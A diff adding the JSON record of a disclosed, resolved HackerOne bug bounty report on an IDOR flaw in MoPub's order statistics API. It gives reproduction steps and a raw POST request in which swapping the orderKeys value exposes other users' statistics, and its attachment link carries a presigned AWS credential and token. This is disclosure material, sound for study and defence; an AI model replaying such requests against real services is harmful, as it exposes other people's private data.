@@ -1,0 +1,146 @@
+{
+  "id": 544329,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDQzMjk=",
+  "url": "https://hackerone.com/reports/544329",
+  "title": "IDOR and statistics leakage in Orders ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-04-20T18:33:14.854Z",
+  "submitted_at": "2019-04-20T18:33:14.854Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "updatelap",
+    "url": "/updatelap",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/032cpktwvilgetq89qfegm1sqk87/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "X / xAI",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-06-14T00:08:40.415Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-05-15T00:08:39.771Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:** \nTwitter on its service \"MoPub\" statistics dedicated to the results of \"Order\", after the test shows that the endpoint \"https://app.mopub.com/web-client/api/orders/stats/query\" is infected with a \"IDOR \" bug\n\nWhich led to the leak of private statistics \"Orders\" by another users\n\n## Steps To Reproduce:\n\n  1. [Create account in https://app.mopub.com/ and login]\n  1. [go to the link https://app.mopub.com/orders and create Order ]\n  1. [using this POST Request you can disclose statistics another orders By changing the value of the parameter __orderKeys__ in body request]\n\n```\nPOST /web-client/api/orders/stats/query HTTP/1.1\nHost: app.mopub.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://app.mopub.com/orders\nContent-Type: application/json\nx-csrftoken: {TOKEN}\nContent-Length: 98\nConnection: close\nCookie: csrftoken={TOKEN}; sessionid={SID}; mp_mixpanel__c=1;\n\n\n{\"startTime\":\"2019-04-07\",\"endTime\":\"2019-04-20\",\"orderKeys\":[\"43b29d60a9724fa9abbdc800044002d6\"]}\n```\n{F472873}\n\n## Impact\n\n__leakage statistics__",
+  "bounty_amount": "289.0",
+  "formatted_bounty": "$289",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 472873,
+      "file_name": "OrderDiscStat.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/472/873/3545cb5d390140af23d6068ee8c540c9c0622bcb/OrderDiscStat.png?response-content-disposition=attachment%3B%20filename%3D%22OrderDiscStat.png%22%3B%20filename%2A%3DUTF-8%27%27OrderDiscStat.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZUHQDDBU%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T014640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDq9%2B4RAGto8X9IFtGN%2FUICC%2Fo63ftLJNQCsYnDIVEFMgIhAIcdMmUcGL5uSa96zhv2F9zEifJta95dNpaVfxlVMvMEKroFCKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igy1k%2Felb61VxVZPsL0qjgVnIOqoDZ%2B3Wl3QbE56JwHpdWMct1MaC9JR7O2LSRZgcltWTboD2wpZ4ERdGo3ukus%2Bstq0jQEo%2FlWOXrgJh%2B5w9Mijp8fZC04NZ7qzTNDU7%2BvHI1bJM7aENXsYP%2BZ08waL4oonS12NPeTFvYtK%2FNxpzevYOubcQpHisn5rHp0tdmafeOHCDW2knAlpqITFwqwc3Vvn41LJPjOs6%2BU%2BgCj8wvimfQYLv7AY%2B5QF2xQ%2BQQXOw0Yz9NpvQrqUBkueOCIHCenqOicTyybCb3rNwcEr6UYVnk4CiRl4LhbFinNEpQS3SHWPII1CG0cfueRJXfkmsBOJhsvDI1jsmGlCjcsu7NhxzXedbMu%2F0KRfUrlckjbIVNJmNqgu67VzouSU0%2Fg%2FH5f5xUQt4S4qGN8hf1J3PSmfFvtQaHtv2bCBU%2B5JyzlEDh41P7xrQkRHdRM%2Bbg6kN4VW0dqzVfSuPMt2lbTPY8I%2Bv%2BZomIPEwYNheqTlPln04Fjf8%2BBcTRRLPGE83zugKB4DuOQYu%2Fp2vkg8cb6dRxb1trYaDfV6DUxOBlqzd4ezRlMMDdUPhtBgxOXvf%2FAsHBT1oCoB1fQIqCSCaUbf20n0Xyvj4SsJOWDEk0%2Btt%2B1LA5%2FRuXEvhCtGeTYfbFAIn5xWS1AvYnzOautiQtDlgNCqDzLsR9WzpV1Ugle%2BI8zUYWDQw1Upv1B0yz7MH6ymCQ2I7StKJyUKCfxKliiFWWQshikPtcLWbXReLNy0sjyc0DNZdQb%2B9ixotEitn8pHvcX7XYV%2Ba%2FBsFZ7jmLH0ZMkh2dxo8NL%2FfhIX8f%2BKGTxD6FHi8KiCYqRAjYx1GugkoviNp%2FdMqYeZ6tpJCFSlVoqvOa6QyrEwqjI1mzEws%2B7jzAY6sAEE4SF3zqH7Co%2FE7EJDoly44npupwttbyIlMdu%2FRWwUNnfToUvSUaO2%2FR%2FV4pCKHr1J8brlthLGSCG3qS0i3efVihCMGK5hjr2OTCAukDeKcmusitc1RagUh3tz%2BqPVx7ufFNpZIav9YGIiiKW96aqw%2BsX2COI4Lq7a092H3rXOKxFX%2BON1xi%2F0PVoZJXif7F25BJ7OtjNKkKL0eu8B%2F7wB%2BfIQRAM2pCb0nO4dRtV4mg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=20ab4f98ea02314b4d5afab0218c41ca726900c969e28332a6d2ecd43adb8e89",
+      "file_size": 67284,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-06-14T00:08:39.825Z",
+  "allow_singular_disclosure_after": -211167480.84619159,
+  "singular_disclosure_allowed": true,
+  "vote_count": 136,
+  "voters": [
+    "loaymorad",
+    "smither",
+    "k1nsbru",
+    "tangoj",
+    "wargsec",
+    "aboalezz",
+    "defenderwww",
+    "lucky_luke",
+    "base_64",
+    "rook1337",
+    "and 126 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1074,
+    "asset_type": "URL",
+    "asset_identifier": "mopub.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
